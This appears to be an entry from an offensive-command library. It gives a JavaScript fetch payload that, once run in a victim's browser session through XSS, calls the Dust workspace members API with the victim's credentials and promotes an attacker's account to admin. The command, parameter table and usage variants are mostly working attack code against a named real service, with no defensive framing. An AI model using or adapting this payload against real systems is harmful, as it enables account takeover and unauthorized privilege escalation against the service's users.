---
id: 123e4567-e89b-12d3-a456-426614174008
data: >-
  const workspaceId = '<extracted_ws_id>'; const attackerUserId = '<dummy_id>';
  fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`,
  {method: 'POST', headers: {'content-type': 'application/json', 'accept':
  '*/*', 'x-commit-hash': '41c0391'}, credentials: 'include', body:
  JSON.stringify({role: 'admin'})}).then(r => console.log(r));

  output: null

  created_at: 2023-10-01T00:00:00Z

  updated_at: 2023-10-01T00:00:00Z

  platforms: [
    "Web"
  ]

  tags: [
    "javascript",
    "escalation"
  ]

  ---
tags:
  - javascript
  - escalation
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.208Z'
verified: false
validated: true
submitted: true
---
# promote-user-role-fetch

## Command

```javascript
const workspaceId = '<extracted_ws_id>'; const attackerUserId = '<dummy_id>'; fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {method: 'POST', headers: {'content-type': 'application/json', 'accept': '*/*', 'x-commit-hash': '41c0391'}, credentials: 'include', body: JSON.stringify({role: 'admin'})}).then(r => console.log(r));
```

## Description

This JavaScript command POSTs to the Dust members API to update the attacker's role to 'admin', executed in the victim's session via XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Dynamic: https://dust.tt/api/w/${workspaceId}/members/${attackerUserId} | Yes |
| method | POST | Yes |
| headers | Content-type JSON, accept, x-commit-hash | Yes |
| body | JSON {role: 'admin'} | Yes |
| credentials | 'include' for auth | Yes |

## Examples

### Basic Usage

```javascript
fetch(`/api/w/${wsId}/members/${userId}`, {method: 'POST', body: JSON.stringify({role: 'admin'}), credentials: 'include'});
```

### Advanced Usage

With error handling:

```javascript
.then(r => {
  if (r.ok) console.log('Role escalated');
  else console.error('Failed');
});
```

## Expected Output

HTTP response (200 OK) indicating successful role update; no body specified, but status confirms change.

## Related

- [[commands/fetch-user-data-javascript]]
- [[procedures/Trigger-XSS-for-Privilege-Escalation]]
